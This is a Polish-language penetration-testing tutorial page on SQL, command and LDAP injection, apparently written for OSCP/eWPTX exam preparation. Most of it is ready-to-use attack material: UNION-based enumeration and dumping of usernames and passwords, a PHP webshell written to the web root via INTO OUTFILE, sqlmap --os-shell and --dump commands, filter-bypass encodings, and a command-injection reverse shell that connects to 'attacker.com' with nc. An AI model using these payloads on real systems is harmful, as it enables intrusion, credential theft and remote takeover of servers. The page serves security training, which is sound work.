---
id: "injection-attacks"
title: "Injection Attacks (SQL Injection, Command Injection, LDAP Injection)"
sidebar_position: 8
---

# Injection Attacks (SQL Injection, Command Injection, LDAP Injection)

Ataki typu Injection polegają na wstrzyknięciu złośliwego kodu do aplikacji webowej w celu manipulacji danymi lub wykonania nieautoryzowanych poleceń. W tej sekcji omówimy najczęściej spotykane rodzaje ataków: **SQL Injection, Command Injection oraz LDAP Injection**.

---

##  SQL Injection
SQL Injection (SQLi) polega na manipulacji zapytaniami SQL w celu uzyskania nieautoryzowanego dostępu do bazy danych.

---

## 🔬 Ręczny SQL Injection (UNION-based)

Automatyczne narzędzia jak sqlmap bywają zablokowane przez WAF lub zbyt hałaśliwe. Ręczne techniki są niezbędne na egzaminach OSCP/eWPTX i pozwalają w pełni zrozumieć podatność.

### **1️⃣ Ustalenie liczby kolumn**
Zwiększaj liczbę kolumn w `ORDER BY` aż do błędu — poprzednia liczba to liczba kolumn:

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← błąd → 2 kolumny
```

Alternatywnie przez `UNION NULL`:
```sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
```

### **2️⃣ Identyfikacja widocznych kolumn i wersji bazy**
Gdy znasz liczbę kolumn, sprawdź które są renderowane w odpowiedzi:

```sql
' UNION SELECT 1,2 --
' UNION SELECT 'a',NULL --
' UNION SELECT NULL,'a' --
```

Wydobądź wersję i użytkownika bazy:
```sql
' UNION SELECT VERSION(),user() --
' UNION SELECT @@version,@@datadir --
```

### **3️⃣ Enumeracja baz, tabel i kolumn przez information_schema**

Dostępne bazy danych:
```sql
' UNION SELECT schema_name,NULL FROM information_schema.SCHEMATA --
```

Tabele w wybranej bazie:
```sql
' UNION SELECT table_name,NULL FROM information_schema.TABLES WHERE table_schema='mydb' --
```

Kolumny w tabeli `users`:
```sql
' UNION SELECT column_name,NULL FROM information_schema.COLUMNS WHERE table_name='users' --
```

Dump danych:
```sql
' UNION SELECT username,password FROM users --
```

### **4️⃣ Zapis webshella przez INTO OUTFILE**
Jeśli baza działa na tym samym serwerze co web root i użytkownik MySQL ma uprawnienia `FILE`:

```sql
' UNION SELECT "<?php echo shell_exec($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php' --
```

Weryfikacja dostępu:
```bash
curl "http://example.com/shell.php?cmd=id"
```

> **Wymaga:** `FILE` privilege w MySQL, katalog web root zapisywalny dla procesu MySQL, brak `secure_file_priv`.

### **5️⃣ sqlmap –os-shell**
Gdy ręczny test potwierdził podatność i uprawnienia FILE, sqlmap może przejąć shell:

```bash
sqlmap -u "http://example.com/index.php?id=1" --os-shell
```

sqlmap automatycznie wgra webshell i uruchomi interaktywną konsolę. Opcja `--web-root` wskazuje ścieżkę jeśli autodetekcja zawodzi:
```bash
sqlmap -u "http://example.com/index.php?id=1" --os-shell --web-root="/var/www/html"
```

---

### **6️⃣ Wykorzystanie sqlmap**
`sqlmap` to narzędzie automatyzujące wykrywanie i eksploatację SQL Injection.

#### **Podstawowe skanowanie**
```bash
sqlmap -u "http://example.com/index.php?id=1" --dbs
```
Opcje:
- `--dbs` – wyświetla dostępne bazy danych
- `--tables` – wyświetla tabele danej bazy danych
- `--columns` – wyświetla kolumny w tabeli

#### **Eksfiltracja danych**
```bash
sqlmap -u "http://example.com/index.php?id=1" -D mydb -T users --dump
```
Wyciąga wszystkie rekordy z tabeli `users`.

#### **Wykorzystanie sesji i cookies**
Jeżeli aplikacja wymaga autoryzacji:
```bash
sqlmap -u "http://example.com/profile.php?id=5" --cookie="PHPSESSID=xyz123" --dbs
```

---

## 🚀 Bypassowanie filtrów
Wiele aplikacji stosuje mechanizmy obronne, ale można je obejść stosując różne techniki:

### **1️⃣ Użycie znaków zastępczych**
```sql
?id=1' OR '1'='1
```

### **2️⃣ Zmiana kodowania**
W niektórych przypadkach można ominąć filtry poprzez enkodowanie znaków:
```sql
?id=1%27%20OR%20%271%27%3D%271
```

### **3️⃣ SQL Injection w JSON/API**
Jeśli aplikacja komunikuje się przez API:
```json
{"user": "admin' OR '1'='1", "password": "test"}
```

---

## 🔎 Blind SQLi i czasowe ataki
Jeżeli aplikacja nie zwraca błędów SQL, można wykorzystać **Blind SQL Injection**.

### **1️⃣ Boolean-based Blind SQLi**
Sprawdzenie, czy aplikacja zwraca różne wyniki dla TRUE/FALSE:
```sql
?id=1' AND 1=1 -- 
?id=1' AND 1=2 -- 
```
Jeżeli pierwszy zwraca dane, a drugi nie – aplikacja jest podatna.

### **2️⃣ Time-based Blind SQLi**
Jeśli aplikacja nie zwraca żadnych danych, można sprawdzić podatność przez opóźnienia:
```sql
?id=1' AND SLEEP(5) -- 
```
Jeśli serwer odpowiada z opóźnieniem, to aplikacja jest podatna na SQLi.

W `sqlmap`:
```bash
sqlmap -u "http://example.com/index.php?id=1" --technique=T
```

---

##  Command Injection
Command Injection pozwala na wykonanie poleceń systemowych poprzez podatną aplikację.

### **1️⃣ Wykrywanie podatności**
Podstawowe payloady:
```bash
http://example.com/ping.php?host=127.0.0.1; id
http://example.com/ping.php?host=127.0.0.1 && whoami
```

### **2️⃣ Eksploatacja**
Przykładowe wykorzystanie:
```bash
?host=127.0.0.1 | nc -e /bin/bash attacker.com 4444
```

---

##  LDAP Injection
LDAP Injection jest atakiem na systemy uwierzytelniania oparte na LDAP.

### **1️⃣ Przykład podatnego zapytania**
```bash
(&(user=admin)(password=mypassword))
```
Można go obejść poprzez:
```bash
admin)(&))(
```

### **2️⃣ LDAP Injection payloads**
- `*)(&)` – bypassowanie autoryzacji
- `*` – wyszukiwanie wszystkich użytkowników

---

Ataki Injection są jednymi z najczęściej wykorzystywanych podatności w aplikacjach webowych. Kolejnym krokiem będzie analiza podatności związanych z **Broken Authentication & Session Management**. 
